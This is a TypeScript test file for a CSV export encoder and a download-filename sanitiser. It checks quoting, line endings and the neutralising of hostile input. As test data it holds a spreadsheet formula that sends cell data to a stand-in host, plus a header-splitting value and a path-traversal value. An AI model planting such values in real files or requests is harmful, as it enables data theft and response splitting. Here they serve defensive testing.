/**
 * The CSV encoder.
 *
 * Worth this much attention for a format this simple because both of its
 * failure modes are silent. A quoting mistake shifts every column on a row, and
 * the file still opens. A formula-injection mistake produces a file that opens
 * perfectly and then does something on the administrator's machine.
 */
import { describe, expect, it } from "vitest";
import { attachmentFilename, toCsv } from "../lib/csv";

const columns = [
  { header: "email", value: (r: { email: string; name: unknown }) => r.email },
  { header: "name", value: (r: { email: string; name: unknown }) => r.name },
];

/** The data rows, without the header, split on the CRLF the format requires. */
function bodyRows(csv: string): string[] {
  return csv.trimEnd().split("\r\n").slice(1);
}

describe("the shape of the file", () => {
  it("writes a header from the column list", () => {
    expect(toCsv(columns, [])).toBe('"email","name"\r\n');
  });

  it("ends lines with CRLF, as RFC 4180 requires", () => {
    /*
     * Not pedantry: Excel on Windows renders a file with bare newlines as one
     * very long single line, which reads as "the export is broken".
     */
    const csv = toCsv(columns, [{ email: "a@b.test", name: "A" }]);
    expect(csv).toBe('"email","name"\r\n"a@b.test","A"\r\n');
  });

  it("quotes every field, so a delimiter can never shift a column", () => {
    const csv = toCsv(columns, [{ email: "a@b.test", name: "Doe, Jane" }]);
    expect(bodyRows(csv)[0]).toBe('"a@b.test","Doe, Jane"');
  });

  it("doubles embedded quotes rather than ending the field early", () => {
    const csv = toCsv(columns, [{ email: "a@b.test", name: 'Jane "JJ" Doe' }]);
    expect(bodyRows(csv)[0]).toBe('"a@b.test","Jane ""JJ"" Doe"');
  });

  it("keeps a newline inside a name inside its field", () => {
    const csv = toCsv(columns, [{ email: "a@b.test", name: "Jane\nDoe" }]);
    expect(bodyRows(csv).join("\r\n")).toBe('"a@b.test","Jane\nDoe"');
  });

  it("writes an empty field for null and undefined, not the word", () => {
    const csv = toCsv(columns, [
      { email: "a@b.test", name: null },
      { email: "c@d.test", name: undefined },
    ]);
    expect(bodyRows(csv)).toEqual(['"a@b.test",""', '"c@d.test",""']);
  });

  it("writes dates as UTC ISO 8601, which means one thing everywhere", () => {
    /*
     * A locale-formatted date is ambiguous the moment the file crosses a
     * border: 03/04 is the third of April to the organiser and the fourth of
     * March to the sponsor.
     */
    const csv = toCsv(columns, [{ email: "a@b.test", name: new Date("2026-09-26T07:34:00Z") }]);
    expect(bodyRows(csv)[0]).toBe('"a@b.test","2026-09-26T07:34:00.000Z"');
  });

  it("writes booleans as true and false", () => {
    const csv = toCsv(columns, [{ email: "a@b.test", name: false }]);
    expect(bodyRows(csv)[0]).toBe('"a@b.test","false"');
  });
});

describe("a spreadsheet must not execute what a stranger typed", () => {
  /*
   * Every one of these is a value somebody can put in the name field of a
   * public signup form. The CSV itself is never malformed — the injection
   * happens inside Excel, LibreOffice or Sheets when an administrator opens
   * the export on their own machine, with their own permissions.
   */
  it.each([
    ['=HYPERLINK("http://evil.test?"&A1,"Click")', "a formula that exfiltrates another cell"],
    ["=1+1", "a bare formula"],
    ["+1+1", "the plus form"],
    ["-1+1", "the minus form"],
    ["@SUM(A1)", "the at form"],
    ["\tSUM(A1)", "a tab, which is stripped on paste and exposes what follows"],
    ["\r=1+1", "a carriage return, likewise"],
  ])("neutralises %s — %s", (payload) => {
    const csv = toCsv(columns, [{ email: "a@b.test", name: payload }]);
    const field = bodyRows(csv)[0]!.split('","')[1]!;
    expect(field.startsWith("'"), `"${payload}" must be prefixed`).toBe(true);
  });

  it("leaves an ordinary name untouched", () => {
    const csv = toCsv(columns, [{ email: "a@b.test", name: "Jane O'Hara" }]);
    expect(bodyRows(csv)[0]).toBe('"a@b.test","Jane O\'Hara"');
  });

  it("leaves a name that merely CONTAINS an equals sign untouched", () => {
    // Only a LEADING formula character is dangerous. Escaping more than that
    // corrupts ordinary data to no benefit.
    const csv = toCsv(columns, [{ email: "a@b.test", name: "a=b" }]);
    expect(bodyRows(csv)[0]).toBe('"a@b.test","a=b"');
  });
});

describe("the filename in the Content-Disposition header", () => {
  it("keeps an ordinary name", () => {
    expect(attachmentFilename("inkloom-accounts-2026-09-26")).toBe("inkloom-accounts-2026-09-26");
  });

  it("strips a quote, which would otherwise break out of the header", () => {
    expect(attachmentFilename('a"b')).toBe("a-b");
  });

  it("strips a newline, which would otherwise split the response", () => {
    /*
     * A CR or LF here is a response-splitting vector, and this value carries a
     * caller-supplied label.
     */
    expect(attachmentFilename("a\r\nSet-Cookie: x=1")).toBe("a--Set-Cookie--x-1");
  });

  it("strips a path traversal attempt", () => {
    expect(attachmentFilename("../../etc/passwd")).toBe("..-..-etc-passwd");
  });

  it("falls back to a name rather than producing an empty one", () => {
    expect(attachmentFilename("///")).toBe("export");
  });

  it("stays a sensible length", () => {
    expect(attachmentFilename("x".repeat(500))).toHaveLength(100);
  });
});
